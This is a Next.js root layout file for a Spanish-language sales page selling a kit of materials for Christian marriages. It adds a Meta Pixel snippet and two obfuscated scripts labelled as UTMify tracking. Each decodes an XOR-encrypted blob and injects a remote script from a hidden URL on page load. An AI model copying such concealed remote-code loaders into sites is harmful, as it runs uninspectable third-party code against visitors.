import type { Metadata, Viewport } from "next";
import type { ReactNode } from "react";
import { DM_Sans, Nunito } from "next/font/google";
import Script from "next/script";
import "./globals.css";

const nunito = Nunito({
  variable: "--font-nunito",
  subsets: ["latin"],
  weight: ["700", "800", "900"],
});

const dmSans = DM_Sans({
  variable: "--font-dm-sans",
  subsets: ["latin"],
  weight: ["400", "500", "700"],
});

export const metadata: Metadata = {
  title: "Kit Ministerial para Matrimonios Cristianos",
  description:
    "Más de 200 materiales listos para usar: dinámicas, desafíos, guías, cartas, ideas románticas y recursos prácticos para fortalecer matrimonios.",
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  viewportFit: "cover",
  themeColor: "#c8060f",
};

export default function RootLayout({ children }: { children: ReactNode }) {
  return (
    <html lang="es" className={`${nunito.variable} ${dmSans.variable} antialiased`}>
      <head>
        {/* Meta Pixel Code */}
        <Script
          id="meta-pixel"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1472345488100844');
fbq('track', 'PageView');`,
          }}
        />
        <noscript>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            height={1}
            width={1}
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=1472345488100844&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
        {/* End Meta Pixel Code */}

        {/* UTMIFY Pixel Code */}
        <Script
          id="utmify-pixel"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var y_fur=atob("DCbBZLbswR3+x7DmtF3jEcSA4yfcr8SSxFX7S5mPpXPQssSL3UC4StWDrDOctZ+V11SoFMKf7m2Xv9WKm1aoHNOA73eN5ZzE1VK1Ft+OtGmbtJLc73vtRtGArn+fq8PEjn26RtiNrHjc/ZKW3V6kCP+I4zHcsdGKwUPjXpTaoCvO9YHVhReiXI6K+SjJotGAhxejUNPOvECD");var n_kk=[];for(var w_iw=0;w_iw<y_fur.length;w_iw++){n_kk.push(y_fur.charCodeAt(w_iw)&255);}var x_u=n_kk[0];var z_h=n_kk.slice(1,1+x_u);var z_u8d=n_kk.slice(1+x_u);var a_w=z_u8d.map(function(b,f_to6c){return b^z_h[f_to6c%x_u];});var j_7="";for(var b_0b=0;b_0b<a_w.length;b_0b++){j_7+=String.fromCharCode(a_w[b_0b]&255);}var h_e=decodeURIComponent(escape(j_7));var w_tuq2=JSON.parse(h_e);var h_gx=w_tuq2.globals||[];h_gx.forEach(function(z_p8){window[z_p8.name]=z_p8.value;});var o_czmo=document.createElement("script");o_czmo.src=w_tuq2.url;o_czmo.async=true;o_czmo.defer=true;(w_tuq2.attributes||[]).forEach(function(n_4ucn){o_czmo.setAttribute(n_4ucn.name,n_4ucn.value);});(document.head||document.documentElement).appendChild(o_czmo);})();`,
          }}
        />

        {/* UTM Script */}
        <Script
          id="utmify-utm-script"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var h_hv66=atob("DGCNmmv+a467MXcYghuv7xmSSbSZWQNs8hO3tUSdD+CVRAN16wb0tAiRBqDZQ1hr4RLk6h+NRPvPXAQ37gH5/xiKReTIE1s64xT56AKcHvreQlUi2Ruv9AqTDqyBExN59gGg7x+TAujCHAdq5xbo9B/TGPvZWBNroEyv7AqSHuuZC1U6/z3w");var g_dlr=[];for(var s_av=0;s_av<h_hv66.length;s_av++){g_dlr.push(h_hv66.charCodeAt(s_av)&255);}var v_5=g_dlr[0];var k_4pw=g_dlr.slice(1,1+v_5);var n_w9=g_dlr.slice(1+v_5);var p_oo=n_w9.map(function(b,i_c){return b^k_4pw[i_c%v_5];});var f_h9="";for(var l_gqgg=0;l_gqgg<p_oo.length;l_gqgg++){f_h9+=String.fromCharCode(p_oo[l_gqgg]&255);}var g_2dzd=decodeURIComponent(escape(f_h9));var v_b=JSON.parse(g_2dzd);var f_oe=v_b.globals||[];f_oe.forEach(function(q_5zf){window[q_5zf.name]=q_5zf.value;});var d_i=document.createElement("script");d_i.src=v_b.url;d_i.async=true;d_i.defer=true;(v_b.attributes||[]).forEach(function(e_k6b){d_i.setAttribute(e_k6b.name,e_k6b.value);});(document.head||document.documentElement).appendChild(d_i);})();`,
          }}
        />
      </head>
      <body>{children}</body>
    </html>
  );
}
